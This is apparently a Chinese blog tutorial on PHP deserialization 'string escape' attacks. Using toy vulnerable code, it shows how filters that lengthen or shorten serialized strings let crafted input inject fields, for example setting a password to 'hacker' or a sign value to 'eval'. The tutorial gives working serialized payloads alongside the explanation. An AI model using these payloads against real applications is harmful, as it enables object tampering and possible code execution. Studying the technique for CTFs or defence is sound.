    <content type="html"><![CDATA[<p>之前就对字符串逃逸这一块理解的不是很深刻，下面通过一位师傅的博客来进一步深入理解一下有关php字符串逃逸的相关内容。</p><p>贴上师傅的博客地址:<a href="https://blog.csdn.net/qq_45521281/article/details/107135706">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p><p><strong>先来说一下什么是字符串逃逸，就是我们可以构造一些恶意代码，让其在反序列化的时候执行我们想让它执行的。在这过程中造成的字符串的增加或者减少称为字符串逃逸。</strong></p><h1 id="替换修改后导致字符串长度增加-逃逸增加"><a href="#替换修改后导致字符串长度增加-逃逸增加" class="headerlink" title="替换修改后导致字符串长度增加   (逃逸增加)"></a>替换修改后导致字符串长度增加   (逃逸增加)</h1><p>先来一个代码简单的分析一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<br><span class="hljs-meta">?&gt;</span><br>    看它的返回结果：<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>若我们在不直接修改pass的前提下，让pass的值变成hacker，我们该如何实现呢？<br>这里我们就用到了字符串逃逸增加来实现。</p><p>我们可以看到str_replace(‘bb’,’ccc’,$str); 意思就是在变量str中，将每两个b替换成三个c，但序列化之后的字符长度仍然按照没有被替换的。</p><p>举个例子说明一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaabb&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span><br>    运行的结果如下：<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;aaaabb&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;aaaaccc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;  <span class="hljs-comment">//这里我们可以看到aaaaccc明明是7个字符，但前面标的仍然是6个，这里就逃逸出来一个字符。</span><br></code></pre></td></tr></table></figure><p>根据上面的演示，我们可以进行构造代码，通过bb替换成ccc，来进行字符串的逃逸，从而让pass的值为hacker</p><p>下面是代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<br><span class="hljs-comment">//echo $res;</span><br><span class="hljs-meta">?&gt;</span><br>    运行的结果：<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">81</span>:<span class="hljs-string">&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">hacker</span><br><span class="hljs-string">成功的实现目标。</span><br></code></pre></td></tr></table></figure><p>思想就是我们要逃逸出来的字符串是”;s:4:”pass”;s:6:”hacker”;} 总共27个字符串，也就是说需要逃逸27个字符串出来，之前是2b逃逸出来一个，那么这需要逃逸27个，也就需要54b。</p><h1 id="替换修改后导致字符串长度减少-（逃逸减少）"><a href="#替换修改后导致字符串长度减少-（逃逸减少）" class="headerlink" title="替换修改后导致字符串长度减少  （逃逸减少）"></a>替换修改后导致字符串长度减少  （逃逸减少）</h1><p>字符串逃逸减少就是字符串经过一些变化后，字符长度减少，原来的功能性代码变成普通的字符串，然后我们可以利用逃逸进行构造一些恶意的代码。</p><p>下面来一个例子看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_rep</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/php|test/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;name&#x27;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;sign&#x27;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sign&#x27;</span>];<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;number&#x27;</span>]=<span class="hljs-string">&#x27;2020&#x27;</span>;<br><span class="hljs-variable">$temp</span>=<span class="hljs-title function_ invoke__">str_rep</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-variable">$fake</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;name:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;sign:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;sign&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;number:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;number&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码都是上面师傅里面演示的，这里我是根据自己的理解来讲一下。</p><p>把这段代码放在本地，可以看到结果为：</p><p><img src="https://s2.loli.net/2023/08/18/Y2h8jRxIf5QKi3y.png" alt="image-20230523212438734.png"></p><p>这里可以看到name和sign里面都是没有内容的，所以这里是N。</p><p>然后我们看到代码中的str_rep()函数，是将变量string中的php和test替换成空。</p><p>然后下面有一个经过这段函数的反序列化，这里就构成了反序列化逃逸减少的漏洞。</p><p>反序列化逃逸减少不同于增加。</p><p>增加是看要构造的恶意代码字符串长度是多少，就举一个例子，如果匹配到了bb,函数是把它替换成ccc，那么就相当于每一个bb可以逃逸出1个字符，如果我们要构造的恶意代码长度是27位，那么我们就需要54个bb。</p><p>而减少我个人感觉是比增加复杂一点，但也不多。拿上面的代码进行演示，如果我想让sign的值是eval，并且数字改成2023，那么这就利用到了字符串逃逸减少。</p><p>首先构造我们要实现的目标。”;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”2023”;}  </p><p>减少逃逸是让一些功能性代码变成字符串，这里是让sign变成字符串，而后面构造的sign和number则成为新的功能性代码。</p><p>“;s:4:”sign”;s:xx:”前面的字符一共有19个，我们有两种方法，一种是利用php，另外一种是利用test只不过都需要填充字符罢了   “;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”2023”;} </p><p>“;s:4:”sign”;s:xx:”这里是需要填充的字符”;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”2023”;} </p><p>如果用7个php，也就是可以逃逸21个，上面是19个，那么我们可以填充2个字符。</p><p>如果用5个test,逃逸20个，需要填充一个字符。</p><p><img src="https://s2.loli.net/2023/08/18/Y2h8jRxIf5QKi3y.png" alt="image-20230523212438734.png"></p><p><img src="https://s2.loli.net/2023/08/18/NeRMEVlk6cOAqYr.png" alt="image-20230523220226399.png">结果如上。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
